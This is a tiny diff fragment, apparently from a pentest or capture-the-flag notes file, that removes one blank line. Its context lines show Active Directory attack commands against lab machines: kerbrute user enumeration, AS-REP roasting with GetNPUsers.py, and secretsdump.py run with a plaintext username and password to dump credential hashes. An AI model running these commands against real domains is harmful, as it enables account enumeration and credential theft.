@@ -18,7 +18,6 @@ kerbrute userenum --dc 10.10.10.192 -d BLACKFIELD.local user_name.txt
 GetNPUsers.py BLACKFIELD.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.192 -format john
 ```
 
-
 ```
 secretsdump.py 'cascade.local/s.smith:sT333ve2'@10.10.10.182
 ```
